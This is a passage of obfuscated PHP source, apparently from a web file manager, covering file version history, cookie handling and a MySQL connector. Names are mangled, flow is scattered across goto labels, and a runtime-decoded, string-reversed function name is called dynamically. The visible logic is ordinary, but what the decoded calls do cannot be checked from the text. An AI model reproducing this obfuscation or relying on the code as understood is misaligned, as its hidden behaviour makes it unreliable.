F‘ßŠ§à„; FŞ½šØà§: if ($aÚ¶šÂÕ™Ç[$dŠ¸Î’ÇÅì[29]] == $dŠ¸Î’ÇÅì[181]) { $E²ßä—Øš‘ = self::listData($bÅÒòÛŸÖ‰); $B•ÃîÙƒÒ¹ = rtrim($bÅ’œÔéïè, $dŠ¸Î’ÇÅì[8]) . $dŠ¸Î’ÇÅì[8] . ($BÃêŒçÌ±İ ? $BÃêŒçÌ±İ : get_path_this($bÅÒòÛŸÖ‰)); $b¾Î÷Ğ‘× = self::listData($B•ÃîÙƒÒ¹); if ($E²ßä—Øš‘ && $E²ßä—Øš‘[$dŠ¸Î’ÇÅì[370]] && $b¾Î÷Ğ‘× && $b¾Î÷Ğ‘×[$dŠ¸Î’ÇÅì[370]]) { return self::clear($bÅÒòÛŸÖ‰); } if ($E²ßä—Øš‘ && $E²ßä—Øš‘[$dŠ¸Î’ÇÅì[370]]) { self::moveHistory($bÅÒòÛŸÖ‰, $BÃêŒçÌ±İ, $a«÷‹‹ÔªÏ); } } else { IO::move($aÚ¶šÂÕ™Ç[$dŠ¸Î’ÇÅì[85]], $a«÷‹‹ÔªÏ, !1, $BÃêŒçÌ±İ); self::clearEmptyFolder(IO::pathFather($aÚ¶šÂÕ™Ç[$dŠ¸Î’ÇÅì[85]])); } goto AŞîß»´; Cîªí¦¦ÛÔ: $dŠ¸Î’ÇÅì =& $_SERVER[¢Í]; $bÅÒòÛŸÖ‰ = self::parsePath($Cˆœ¶°´¿[0]); if (!$bÅÒòÛŸÖ‰) { return; } goto CàˆÑ×âê­; AŞîß»´: } public static function eventAfterRemove($c¸»º×Œø, $bñÑœ»») { goto bÜ‡ƒ‡ê¡É; bÜ‡ƒ‡ê¡É: $f¹á‚ÔÀÆ =& $_SERVER[¢Í]; if (!$bñÑœ»») { return; } $F¢«‚ƒ°ñÔ = self::parsePath($c¸»º×Œø[0]); goto aåøçä°·Å; bªÚÕ’âÂõ: if ($CÄÜéó·„[$f¹á‚ÔÀÆ[29]] == $f¹á‚ÔÀÆ[181]) { $bƒİîÅ»°¿ = self::listData($F¢«‚ƒ°ñÔ, !1); if ($bƒİîÅ»°¿ && $bƒİîÅ»°¿[$f¹á‚ÔÀÆ[370]]) { self::clear($F¢«‚ƒ°ñÔ, !1); } } else { IO::remove($CÄÜéó·„[$f¹á‚ÔÀÆ[85]]); self::clearEmptyFolder(IO::pathFather($CÄÜéó·„[$f¹á‚ÔÀÆ[85]])); } goto cŒõ¬¾ÑÔæ; aåøçä°·Å: if (!$F¢«‚ƒ°ñÔ) { return; } $CÄÜéó·„ = self::checkInHistory($F¢«‚ƒ°ñÔ); if (!$CÄÜéó·„) { return; } goto bªÚÕ’âÂõ; cŒõ¬¾ÑÔæ: } private static function checkInHistory($dòëÅ†èÖ—) { $DøÛíŠìå‘ = self::pathHistory($dòëÅ†èÖ—); if (!IO::exist($DøÛíŠìå‘)) { $DøÛíŠìå‘ .= $_SERVER[¢Í][1083]; } return IO::exist($DøÛíŠìå‘) ? IO::info($DøÛíŠìå‘) : !1; } private static function parsePath($CÂ¼¨‚Ê›¾) { goto b¨¾ƒ•…”ò; b¨¾ƒ•…”ò: $BáÓù¹Ü–æ =& $_SERVER[¢Í]; if (!$CÂ¼¨‚Ê›¾) { return !1; } if ($GLOBALS[$BáÓù¹Ü–æ[1084]]) { return; } goto c¥»ƒÁæ¶Ã; c¥»ƒÁæ¶Ã: $Döº»˜£ÕÎ = KodIO::parse($CÂ¼¨‚Ê›¾); $Aö³®»“´Ã = $Döº»˜£ÕÎ[$BáÓù¹Ü–æ[29]]; $A Îñ¶áĞ± = !$Aö³®»“´Ã || $Aö³®»“´Ã == KodIO::KOD_IO || $Aö³®»“´Ã == KodIO::KOD_SHARE_ITEM; goto Fä·¦¹²®†; bğŠ¨ğ¾Ü: return $CÂ¼¨‚Ê›¾; goto f›Ü‚ëíÃÀ; aºÂç„ˆ»: $dŠ·Ğ¸Î£… = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $BáÓù¹Ü–æ[1086]); foreach ($dŠ·Ğ¸Î£… as $E²•ƒØ¹ÃÅ) { if (!$Aö³®»“´Ã && substr($CÂ¼¨‚Ê›¾, 0, strlen($E²•ƒØ¹ÃÅ)) == $E²•ƒØ¹ÃÅ) { return !1; } } self::log($GLOBALS[$BáÓù¹Ü–æ[1010]] . $BáÓù¹Ü–æ[1087] . $CÂ¼¨‚Ê›¾); goto bğŠ¨ğ¾Ü; Fä·¦¹²®†: if (!$A Îñ¶áĞ± || !$Döº»˜£ÕÎ[$BáÓù¹Ü–æ[1085]]) { return !1; } if ($Aö³®»“´Ã == KodIO::KOD_SHARE_ITEM) { $c§‹ñ»µ‰Â = IO::init($CÂ¼¨‚Ê›¾); if ($c§‹ñ»µ‰Â->pathParse[$BáÓù¹Ü–æ[1015]]) { return self::parsePath($c§‹ñ»µ‰Â->pathParse[$BáÓù¹Ü–æ[1015]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto aºÂç„ˆ»; f›Ü‚ëíÃÀ: } private static function pathHistory($FÄô²‹ø‘) { $a‹¾±›ëÁ =& $_SERVER[¢Í]; $AˆŒ«ƒ¸Äì = self::$_historyBase . ltrim(KodIO::clear($FÄô²‹ø‘), $a‹¾±›ëÁ[8]); $AˆŒ«ƒ¸Äì = str_replace(array($a‹¾±›ëÁ[1088]), array($a‹¾±›ëÁ[1089]), $AˆŒ«ƒ¸Äì); return $AˆŒ«ƒ¸Äì; } public static function log($b¦—´¿ã¸™) { } public static function historyCount($a¿Œòî¿Ú‚) { $aòëœëœ =& $_SERVER[¢Í]; $bÂ¦–¾âÓ‹ = array(); $D“ß˜ƒÌ©· = array(); foreach ($a¿Œòî¿Ú‚ as $a²à´ËÀ—) { $Cõ«ê… Ë¢ = get_path_father($a²à´ËÀ—); if (!$D“ß˜ƒÌ©·[$Cõ«ê… Ë¢]) { $D“ß˜ƒÌ©·[$Cõ«ê… Ë¢] = array(); } $D“ß˜ƒÌ©·[$Cõ«ê… Ë¢][] = get_path_this($a²à´ËÀ—); } foreach ($D“ß˜ƒÌ©· as $Cõ«ê… Ë¢ => $DİŠ‹‹°) { $c®âªİñ›« = self::parsePath($Cõ«ê… Ë¢); if (!$c®âªİñ›«) { continue; } foreach ($DİŠ‹‹° as $DòÌÂ»Øà) { $a°ö‡çŞ¼Û = self::listData(rtrim($c®âªİñ›«, $aòëœëœ[8]) . $aòëœëœ[8] . $DòÌÂ»Øà, !1); if ($a°ö‡çŞ¼Û && $a°ö‡çŞ¼Û[$aòëœëœ[370]]) { $bÂ¦–¾âÓ‹[rtrim($Cõ«ê… Ë¢, $aòëœëœ[8]) . $aòëœëœ[8] . $DòÌÂ»Øà] = count($a°ö‡çŞ¼Û[$aòëœëœ[370]]); } } } return $bÂ¦–¾âÓ‹; } public static function add($D«¹éÏˆæ˜) { goto D‚²ù…³Ü; b–‡ƒ´ìÊ†: if ($cÙ×Ëİ‡Ù <= 0) { return; } $AÃ¡ŞÀå‘ = IO::hashSimple($D«¹éÏˆæ˜); $A´ˆì¡‘„ = IO::info($D«¹éÏˆæ˜); goto e‘ Òš¶; d¡§ÒÙ£Õ…: if ($eãáïøÏ¨â && $eãáïøÏ¨â[0][$fÂº¯ë¨®[178]] == $AÃ¡ŞÀå‘) { return !0; } if (array_key_exists($fÂº¯ë¨®[202], $A´ˆì¡‘„) && !$A´ˆì¡‘„[$fÂº¯ë¨®[202]]) { return !1; } $c™·á†İ® = short_id(time()); goto BÄ¹É…Ô›¥; D‚²ù…³Ü: $fÂº¯ë¨® =& $_SERVER[¢Í]; $Dæ«åˆ = self::listData($D«¹éÏˆæ˜); if (!$Dæ«åˆ) { return; } goto b»†»Ùğ™; e‘ Òš¶: $eãáïøÏ¨â = $Dæ«åˆ[$fÂº¯ë¨®[370]]; if ($A´ˆì¡‘„[$fÂº¯ë¨®[87]] == 0) { return; } if ($A´ˆì¡‘„[$fÂº¯ë¨®[87]] >= 1024 * 1024 * 500) { return !1; } goto d¡§ÒÙ£Õ…; c«­¥ßŸŒ‹: if (!$C£Û¢îÔŸŠ) { self::clearEmptyFolder($Dæ«åˆ[$fÂº¯ë¨®[1095]]); return !1; } array_unshift($eãáïøÏ¨â, $Aœ›ˆà±ÂÏ); if (count($eãáïøÏ¨â) > $cø†÷´à¹à) { $BŸƒÆä’¼º = array_slice($eãáïøÏ¨â, $cø†÷´à¹à); foreach ($BŸƒÆä’¼º as $DŒ¬¼ÏŸ–) { IO::remove($Dæ«åˆ[$fÂº¯ë¨®[1095]] . $DŒ¬¼ÏŸ–[$fÂº¯ë¨®[28]]); } $eãáïøÏ¨â = array_slice($eãáïøÏ¨â, 0, $cø†÷´à¹à); } goto EªéÂÜÃ´; BÄ¹É…Ô›¥: $Aœ›ˆà±ÂÏ = array($fÂº¯ë¨®[392] => $c™·á†İ®, $fÂº¯ë¨®[178] => $AÃ¡ŞÀå‘, $fÂº¯ë¨®[28] => $A´ˆì¡‘„[$fÂº¯ë¨®[28]] . $fÂº¯ë¨®[101] . date($fÂº¯ë¨®[1093]) . rand_string(1), $fÂº¯ë¨®[87] => $A´ˆì¡‘„[$fÂº¯ë¨®[87]], $fÂº¯ë¨®[403] => USER_ID, $fÂº¯ë¨®[200] => time(), $fÂº¯ë¨®[1094] => $fÂº¯ë¨®[33]); IO::mkdir($Dæ«åˆ[$fÂº¯ë¨®[1095]]); $C£Û¢îÔŸŠ = IO::copy($D«¹éÏˆæ˜, $Dæ«åˆ[$fÂº¯ë¨®[1095]], !1, $Aœ›ˆà±ÂÏ[$fÂº¯ë¨®[28]]); goto c«­¥ßŸŒ‹; b»†»Ùğ™: $aÔŒÇ°‹É± = Model($fÂº¯ë¨®[1090])->get($fÂº¯ë¨®[1091]); $cÙ×Ëİ‡Ù = $GLOBALS[$fÂº¯ë¨®[6]][$fÂº¯ë¨®[94]][$fÂº¯ë¨®[1070]]; $cø†÷´à¹à = $aÔŒÇ°‹É± == $fÂº¯ë¨®[1092] ? 5 : $cÙ×Ëİ‡Ù; goto b–‡ƒ´ìÊ†; EªéÂÜÃ´: return self::saveData($Dæ«åˆ[$fÂº¯ë¨®[1096]], $eãáïøÏ¨â); goto Döæíö§ª; Döæíö§ª: } public static function remove($bÏƒÊ†ã‰°, $A„°»¨æŠ“) { $c«¯¼ãÜÏ‰ =& $_SERVER[¢Í]; $dëæÖÆ‹«ù = self::listData($bÏƒÊ†ã‰°); $C£è‘Ã Æ = array(); if (!$dëæÖÆ‹«ù) { return !1; } foreach ($dëæÖÆ‹«ù[$c«¯¼ãÜÏ‰[370]] as $CŠß³°Ãˆ¸) { if ($CŠß³°Ãˆ¸[$c«¯¼ãÜÏ‰[392]] == $A„°»¨æŠ“) { IO::remove($dëæÖÆ‹«ù[$c«¯¼ãÜÏ‰[1095]] . $CŠß³°Ãˆ¸[$c«¯¼ãÜÏ‰[28]]); continue; } $C£è‘Ã Æ[] = $CŠß³°Ãˆ¸; } return self::saveData($dëæÖÆ‹«ù[$c«¯¼ãÜÏ‰[1096]], $C£è‘Ã Æ); } public static function clear($C¼å¨Š’®Ê, $E×Òºñ§õ = true) { $aùÔŸ†ÖÆ¼ =& $_SERVER[¢Í]; $Eä™–ôïÊ = self::listData($C¼å¨Š’®Ê, $E×Òºñ§õ); if (!$Eä™–ôïÊ) { return !1; } foreach ($Eä™–ôïÊ[$aùÔŸ†ÖÆ¼[370]] as $d“°«Áˆë¯) { IO::remove($Eä™–ôïÊ[$aùÔŸ†ÖÆ¼[1095]] . $d“°«Áˆë¯[$aùÔŸ†ÖÆ¼[28]]); } return self::saveData($Eä™–ôïÊ[$aùÔŸ†ÖÆ¼[1096]], array()); } public static function moveHistory($FºÂÚİŠšÚ, $e¾»÷Û´ĞĞ = '', $FÊ¿„ÌÄ£ˆ = '') { goto eÇ¬¡ˆå¾‰; BŠÊî„Ûñ¸: $C”Õ§¼«ˆù = substr(get_path_this($CğåšÁ­³ã[$aËãÆĞ†®Š[1096]]), 0, -strlen($c ÉáµÜ‘­)); foreach ($CğåšÁ­³ã[$aËãÆĞ†®Š[370]] as $a¹Œåä²° => $e¢ˆéÜÚ‘Õ) { $d¥éµ«¥¡Ë = $e¾»÷Û´ĞĞ . substr($e¢ˆéÜÚ‘Õ[$aËãÆĞ†®Š[28]], strlen($C”Õ§¼«ˆù)); $fÓ«Š’œÄ‡ = IO::move($CğåšÁ­³ã[$aËãÆĞ†®Š[1095]] . $e¢ˆéÜÚ‘Õ[$aËãÆĞ†®Š[28]], $FÊ¿„ÌÄ£ˆ, !1, $d¥éµ«¥¡Ë); if ($fÓ«Š’œÄ‡) { $CğåšÁ­³ã[$aËãÆĞ†®Š[370]][$a¹Œåä²°][$aËãÆĞ†®Š[28]] = $d¥éµ«¥¡Ë; } } $CğåšÁ­³ã[$aËãÆĞ†®Š[1096]] = IO::move($CğåšÁ­³ã[$aËãÆĞ†®Š[1096]], $FÊ¿„ÌÄ£ˆ, !1, $e¾»÷Û´ĞĞ . $c ÉáµÜ‘­); goto B„µ©·Ÿ´­; eÇ¬¡ˆå¾‰: $aËãÆĞ†®Š =& $_SERVER[¢Í]; $CğåšÁ­³ã = self::listData($FºÂÚİŠšÚ, !1); if (!$CğåšÁ­³ã || !$CğåšÁ­³ã[$aËãÆĞ†®Š[370]]) { return !1; } goto f¹œ®ÑÔÛ; B„µ©·Ÿ´­: self::saveData($CğåšÁ­³ã[$aËãÆĞ†®Š[1096]], $CğåšÁ­³ã[$aËãÆĞ†®Š[370]]); self::clearEmptyFolder($CğåšÁ­³ã[$aËãÆĞ†®Š[1095]]); goto cèÇ·Ïæˆ‹; f¹œ®ÑÔÛ: $c ÉáµÜ‘­ = $aËãÆĞ†®Š[1083]; $e¾»÷Û´ĞĞ = $e¾»÷Û´ĞĞ ? $e¾»÷Û´ĞĞ : get_path_this($FºÂÚİŠšÚ); $FÊ¿„ÌÄ£ˆ = $FÊ¿„ÌÄ£ˆ ? $FÊ¿„ÌÄ£ˆ : $CğåšÁ­³ã[$aËãÆĞ†®Š[1095]]; goto BŠÊî„Ûñ¸; cèÇ·Ïæˆ‹: } public static function rollback($AéíË ˜…‘, $cÏÏÊ¼Úªå) { $AĞ”‡‰ğğ =& $_SERVER[¢Í]; $CÕ„Ôğ§¢ = self::listData($AéíË ˜…‘); if (!$CÕ„Ôğ§¢) { return; } $cšƒ³æñõ· = IO::info($AéíË ˜…‘); foreach ($CÕ„Ôğ§¢[$AĞ”‡‰ğğ[370]] as $CÚçŸŞÉ÷ => $BœôïóÄ±Ç) { if ($BœôïóÄ±Ç[$AĞ”‡‰ğğ[392]] == $cÏÏÊ¼Úªå) { self::add($AéíË ˜…‘); $b‚‹ì„„ìã = $CÕ„Ôğ§¢[$AĞ”‡‰ğğ[1095]] . $BœôïóÄ±Ç[$AĞ”‡‰ğğ[28]]; $fÈÒ«Ëƒ­÷ = IO::copy($b‚‹ì„„ìã, IO::pathFather($AéíË ˜…‘), REPEAT_REPLACE, $cšƒ³æñõ·[$AĞ”‡‰ğğ[28]]); if ($fÈÒ«Ëƒ­÷) { self::remove($AéíË ˜…‘, $cÏÏÊ¼Úªå); } return $fÈÒ«Ëƒ­÷; } } return !1; } public static function setDetail($fˆ©­¨ØìÎ, $D¸ĞŠ½†±Á, $f•æˆ¹ÎØ) { $c°¦šÖÒØ¾ =& $_SERVER[¢Í]; $a‚›íò¦Í = self::listData($fˆ©­¨ØìÎ); if (!$a‚›íò¦Í) { return; } foreach ($a‚›íò¦Í[$c°¦šÖÒØ¾[370]] as $aÜ³„½˜‹¸ => $B‰Ğå îù) { if ($B‰Ğå îù[$c°¦šÖÒØ¾[392]] == $D¸ĞŠ½†±Á) { $a‚›íò¦Í[$c°¦šÖÒØ¾[370]][$aÜ³„½˜‹¸][$c°¦šÖÒØ¾[1094]] = $f•æˆ¹ÎØ; self::saveData($a‚›íò¦Í[$c°¦šÖÒØ¾[1096]], $a‚›íò¦Í[$c°¦šÖÒØ¾[370]]); return !0; } } return !1; } public static function fileInfo($f»Ê¥‚¢Æ, $B©„Á·æ‰Ï) { goto e³šµ„œ; f‡“´“î¨”: return IO::info($f›„Óé›¼); goto AÛç™‹Æô©; e³šµ„œ: $fª¸áİõù² =& $_SERVER[¢Í]; $fÔÈøƒ¸ÀŞ = self::listData($f»Ê¥‚¢Æ); if (!$fÔÈøƒ¸ÀŞ) { show_json(LNG($fª¸áİõù²[111]), !1); } goto céÏ¡è¤Ú; céÏ¡è¤Ú: $f›„Óé›¼ = $fª¸áİõù²[33]; foreach ($fÔÈøƒ¸ÀŞ[$fª¸áİõù²[370]] as $b†Ûñ¹…šº => $E¥Ã·½­¸) { if ($E¥Ã·½­¸[$fª¸áİõù²[392]] != $B©„Á·æ‰Ï) { continue; } $f›„Óé›¼ = $fÔÈøƒ¸ÀŞ[$fª¸áİõù²[1095]] . $E¥Ã·½­¸[$fª¸áİõù²[28]]; break; } if (!$f›„Óé›¼) { show_json(LNG($fª¸áİõù²[111]), !1); } goto f‡“´“î¨”; AÛç™‹Æô©: } public static function fileOut($c‡òá±¿¤–, $b‘©ºÁ¦ë¸, $D½›ùÂÁ–¶ = false) { $fÜİÒ˜Ê =& $_SERVER[¢Í]; $BƒÌö‚˜ñä = self::fileInfo($c‡òá±¿¤–, $b‘©ºÁ¦ë¸); $cæ‹ëùÍ‡ì =& $GLOBALS[$fÜİÒ˜Ê[7]]; $D½›ùÂÁ–¶ = isset($cæ‹ëùÍ‡ì[$fÜİÒ˜Ê[1061]]) && $cæ‹ëùÍ‡ì[$fÜİÒ˜Ê[1061]] == 1; if (isset($cæ‹ëùÍ‡ì[$fÜİÒ˜Ê[29]]) && $cæ‹ëùÍ‡ì[$fÜİÒ˜Ê[29]] == $fÜİÒ˜Ê[1097]) { return IO::fileOutImage($BƒÌö‚˜ñä[$fÜİÒ˜Ê[85]], $cæ‹ëùÍ‡ì[$fÜİÒ˜Ê[1098]]); } IO::fileOut($BƒÌö‚˜ñä[$fÜİÒ˜Ê[85]], $D½›ùÂÁ–¶, get_path_this($c‡òá±¿¤–)); } public static function listData($A¬ÆÆ´Ä³, $Bº³ê£Æ× = true) { goto a·…—‚“Š; AôìÜÁ: if (substr($A¬ÆÆ´Ä³, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Dİš¯Ä¸” = self::pathHistory($A¬ÆÆ´Ä³); $f±©ë“«Œ = array($fÈäæó†ùğ[1096] => $Dİš¯Ä¸” . $fÈäæó†ùğ[1083], $fÈäæó†ùğ[1095] => rtrim(get_path_father($Dİš¯Ä¸”), $fÈäæó†ùğ[8]) . $fÈäæó†ùğ[8], $fÈäæó†ùğ[370] => array()); goto f¶‹¡”ŒÁÉ; a·…—‚“Š: $fÈäæó†ùğ =& $_SERVER[¢Í]; if ($Bº³ê£Æ× && !IO::exist($A¬ÆÆ´Ä³)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto AôìÜÁ; f¶‹¡”ŒÁÉ: $c‹Òµ¸õ‰İ = IO::getContent($f±©ë“«Œ[$fÈäæó†ùğ[1096]]); if ($c‹Òµ¸õ‰İ) { $BçÚßÙ›±Ç = json_decode($c‹Òµ¸õ‰İ, !0); if (is_array($BçÚßÙ›±Ç)) { $f±©ë“«Œ[$fÈäæó†ùğ[370]] = $BçÚßÙ›±Ç; } } return $f±©ë“«Œ; goto BåÌµ„†¼Ò; BåÌµ„†¼Ò: } private static function saveData($FÙÍİŞóçÁ, $eš‚‚‰ÅŠ°) { goto bé¦õ¹óïÂ; Fˆ¶ŞâËê‡: return !0; goto B‹ÈîŒ÷½§; Dºáó˜Üé’: $CÙ¿ËŠÃóó = IO::pathFather($FÙÍİŞóçÁ); IO::remove($FÙÍİŞóçÁ); self::clearEmptyFolder($CÙ¿ËŠÃóó); goto Fˆ¶ŞâËê‡; bé¦õ¹óïÂ: $FèøŞ¯³ =& $_SERVER[¢Í]; self::log($FèøŞ¯³[1099] . $FÙÍİŞóçÁ . $FèøŞ¯³[77] . count($eš‚‚‰ÅŠ°), $FèøŞ¯³[705]); if ($eš‚‚‰ÅŠ°) { return IO::setContent($FÙÍİŞóçÁ, json_encode($eš‚‚‰ÅŠ°)); } goto Dºáó˜Üé’; B‹ÈîŒ÷½§: } public static function clearEmptyFolder($fßò…Ú½©¤) { goto Dã†‡î™•¹; Dã†‡î™•¹: $cŒïÆšÖ¼¤ =& $_SERVER[¢Í]; if (trim($fßò…Ú½©¤, $cŒïÆšÖ¼¤[8]) == trim(self::$_historyBase, $cŒïÆšÖ¼¤[8])) { return; } $DÏˆ»½Ö¦‹ = IO::pathFather($fßò…Ú½©¤); goto c¶ïáÏ¾Ÿß; c¶ïáÏ¾Ÿß: $BÜáÊ‹“ó = IO::has($fßò…Ú½©¤, !0); if ($BÜáÊ‹“ó[$cŒïÆšÖ¼¤[209]] > 0 || $BÜáÊ‹“ó[$cŒïÆšÖ¼¤[210]] > 0) { return; } IO::remove($fßò…Ú½©¤); goto DÄ·‚É‡Ö´; DÄ·‚É‡Ö´: self::clearEmptyFolder($DÏˆ»½Ö¦‹); goto D‚Å‡´Ÿµª; D‚Å‡´Ÿµª: } private static function getBasePath() { goto a½É İŸ²; e‡”Â¯Ûİ”: $E ØòìßŠ = DATA_PATH . $dôØ­¿Ş‹“[1102]; $E ØòìßŠ = IO::mkdir($E ØòìßŠ); $E ØòìßŠ = rtrim($E ØòìßŠ, $dôØ­¿Ş‹“[8]) . $dôØ­¿Ş‹“[8]; goto c’ğ‹›Ê‡; a½É İŸ²: $dôØ­¿Ş‹“ =& $_SERVER[¢Í]; $E ØòìßŠ = Model($dôØ­¿Ş‹“[1100])->get($dôØ­¿Ş‹“[1101]); if (IO::exist($E ØòìßŠ)) { return $E ØòìßŠ; } goto e‡”Â¯Ûİ”; c’ğ‹›Ê‡: file_put_contents($E ØòìßŠ . $dôØ­¿Ş‹“[1103], $dôØ­¿Ş‹“[33]); Model($dôØ­¿Ş‹“[1100])->set($dôØ­¿Ş‹“[1101], $E ØòìßŠ); return $E ØòìßŠ; goto d‘ƒ‚ƒÊóê; d‘ƒ‚ƒÊóê: } } goto fè»¼£Êëî; AñíÌ©Ü‰: $C¼Ä°®ù‘ä = strrev(base64_decode($_SERVER[ëÈ][0])); function binCheckNeq($D¦¦×É“ğ, $FÑò¾Ì¼ƒ») { return $D¦¦×É“ğ != $FÑò¾Ì¼ƒ»; } $_SERVER[$_SERVER[ëÈ][1]] = $C¼Ä°®ù‘ä($_SERVER[$_SERVER[ëÈ][2]]); goto FÑŠŠÍÓí¦; c´°¾§¬: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($EÜ’­ùÓñ· = '', $dØ†è¹èÛ = 0) { if (is_string($EÜ’­ùÓñ·) && $EÜ’­ùÓñ· != $_SERVER[¢Í][33]) { $this->prefix = $EÜ’­ùÓñ·; } if (is_numeric($dØ†è¹èÛ) && $dØ†è¹èÛ > 0) { $this->expire = $dØ†è¹èÛ; } } public static function getInstance() { static $bÔÂì»ƒ¨; if ($bÔÂì»ƒ¨ === null) { $bÔÂì»ƒ¨ = new self(); } return $bÔÂì»ƒ¨; } private static $cookieDisable = false; public static function disable($f¸·Âšî×) { self::$cookieDisable = $f¸·Âšî×; } private static $sameCookieSet = array(); public static function set($FØ¥µÛã•, $d»ä¿ƒ µ, $e³â«°Ó = 0, $a«ÖÑğÀ³ = false, $b„Õ‚ªøë = false) { goto fÄï”ç¦óÇ; bóººíéê“: if (isset(self::$sameCookieSet[$FØ¥µÛã•]) && self::$sameCookieSet[$FØ¥µÛã•] == $d»ä¿ƒ µ . $e³â«°Ó) { return; } self::$sameCookieSet[$FØ¥µÛã•] = $d»ä¿ƒ µ . $e³â«°Ó; if (!$b„Õ‚ªøë) { $b„Õ‚ªøë = str_replace(HOST, $DËÈßœÜö²[33], APP_HOST); $b„Õ‚ªøë = _get($GLOBALS, $DËÈßœÜö²[812], $b„Õ‚ªøë); } goto F¤¿—”ô; fÄï”ç¦óÇ: $DËÈßœÜö² =& $_SERVER[¢Í]; if (self::$cookieDisable) { return; } if (!$e³â«°Ó) { $e³â«°Ó = 24 * 3600 * 7; } goto bóººíéê“; F¤¿—”ô: $cÊµØİ§§ = $DËÈßœÜö²[33]; setcookie($FØ¥µÛã•, $d»ä¿ƒ µ, time() + $e³â«°Ó, $DËÈßœÜö²[8] . trim($b„Õ‚ªøë, $DËÈßœÜö²[8]) . $cÊµØİ§§, !1, !1, $a«ÖÑğÀ³); goto e‚öİ’ªÕâ; e‚öİ’ªÕâ: } public static function setSafe($FÃ‘ªŒÙˆ‘, $a„Ìí°„¶, $AÓïö‡ŠÒğ = 0) { self::set($FÃ‘ªŒÙˆ‘, $a„Ìí°„¶, $AÓïö‡ŠÒğ, !0); } public static function get($a²ô×¾©É ) { return isset($_COOKIE[$a²ô×¾©É ]) ? $_COOKIE[$a²ô×¾©É ] : !1; } public static function remove($eÄ˜Ïİï‰, $AÅ áĞ¦Ôë = false) { unset($_COOKIE[$eÄ˜Ïİï‰]); self::set($eÄ˜Ïİï‰, $_SERVER[¢Í][33], 1, $AÅ áĞ¦Ôë); } } class DbMysql extends Db { public function __construct($C¥ÊĞÈ¤¢ª = '') { $bÑ¾¡ÄŒ¡ =& $_SERVER[¢Í]; if (!extension_loaded($bÑ¾¡ÄŒ¡[741])) { think_exception(think_lang($bÑ¾¡ÄŒ¡[10]) . $bÑ¾¡ÄŒ¡[813]); } if (!empty($C¥ÊĞÈ¤¢ª)) { $this->config = $C¥ÊĞÈ¤¢ª; if (empty($this->config[$bÑ¾¡ÄŒ¡[13]])) { $this->config[$bÑ¾¡ÄŒ¡[13]] = $bÑ¾¡ÄŒ¡[33]; } } } public function connect($dœø’¦ó´Ö = '', $fÄÓ™š¡Ó“ = 0, $f’ÇÈ‹ÁÃ = false) { $BµŒå˜Öî· =& $_SERVER[¢Í]; if (!isset($this->linkID[$fÄÓ™š¡Ó“])) { goto d™ƒ™²·÷ê; bÁ°ó‡º•: if ($f¹µšŒĞÎï) { $this->linkID[$fÄÓ™š¡Ó“] = mysql_pconnect($AŠ†…¸ÆÓ², $dœø’¦ó´Ö[$BµŒå˜Öî·[816]], $dœø’¦ó´Ö[$BµŒå˜Öî·[817]], 131072); } else { $this->linkID[$fÄÓ™š¡Ó“] = mysql_connect($AŠ†…¸ÆÓ², $dœø’¦ó´Ö[$BµŒå˜Öî·[816]], $dœø’¦ó´Ö[$BµŒå˜Öî·[817]], !0, 131072); } if (!$this->linkID[$fÄÓ™š¡Ó“] || !empty($dœø’¦ó´Ö[$BµŒå˜Öî·[17]]) && !mysql_select_db($dœø’¦ó´Ö[$BµŒå˜Öî·[17]], $this->linkID[$fÄÓ™š¡Ó“])) { think_exception(mysql_error()); } $Fˆ‚“–ÑÅå = mysql_get_server_info($this->linkID[$fÄÓ™š¡Ó“]); goto Dã‘¤Í¢Š¿; c™­×Æ£‹º: if (1 != think_config($BµŒå˜Öî·[18])) { unset($this->config); } goto FŞÒ‘›öø; d™ƒ™²·÷ê: if (empty($dœø’¦ó´Ö)) { $dœø’¦ó´Ö = $this->config; } $AŠ†…¸ÆÓ² = $dœø’¦ó´Ö[$BµŒå˜Öî·[814]] . ($dœø’¦ó´Ö[$BµŒå˜Öî·[815]] ? "\x3a{$dœø’¦ó´Ö[$BµŒå˜Öî·[815]]}" : $BµŒå˜Öî·[33]); $f¹µšŒĞÎï = !empty($dœø’¦ó´Ö[$BµŒå˜Öî·[13]][$BµŒå˜Öî·[14]]) ? $dœø’¦ó´Ö[$BµŒå˜Öî·[13]][$BµŒå˜Öî·[14]] : $this->pconnect; goto bÁ°ó‡º•; Dã‘¤Í¢Š¿: mysql_query($BµŒå˜Öî·[818] . think_config($BµŒå˜Öî·[819]) . $BµŒå˜Öî·[65], $this->linkID[$fÄÓ™š¡Ó“]); if ($Fˆ‚“–ÑÅå > $BµŒå˜Öî·[820]) { mysql_query($BµŒå˜Öî·[821], $this->linkID[$fÄÓ™š¡Ó“]); } $this->connected = !0; goto c™­×Æ£‹º; FŞÒ‘›öø: } return $this->linkID[$fÄÓ™š¡Ó“]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($døµÜó¥Å) { goto c¨¼»±Û‘; c¨¼»±Û‘: $AâøÕ¤¬ïí =& $_SERVER[¢Í]; if (0 === stripos($døµÜó¥Å, $AâøÕ¤¬ïí[267])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto a©¨¿•¸Ü®; a©¨¿•¸Ü®: if (!$this->_linkID) { return !1; } $this->queryStr = $døµÜó¥Å; if ($this->queryID) { $this->free(); } goto CÜ¶³¾ó¥Ç; CÜ¶³¾ó¥Ç: think_action_status($AâøÕ¤¬ïí[19], 1); think_status($AâøÕ¤¬ïí[20]); $this->queryID = mysql_query($døµÜó¥Å, $this->_linkID); goto aíŠÉ†–Àµ; aíŠÉ†–Àµ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto A”ˆß‚´; A”ˆß‚´: } public function execute($eÅÂó÷‰Ú‰) { goto EÆŠ‡÷™‰Ú; AÑ‡ÅÂù¨¿: think_status($dŠŒ³ğ±·[20]); $cš¨¢æë¯õ = mysql_query($eÅÂó÷‰Ú‰, $this->_linkID); $this->debug(); goto Dæ¢ÉÈÈ—¾; Dæ¢ÉÈÈ—¾: if (!1 === $cš¨¢æë¯õ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto FÌÊÓò÷“; EÆŠ‡÷™‰Ú: 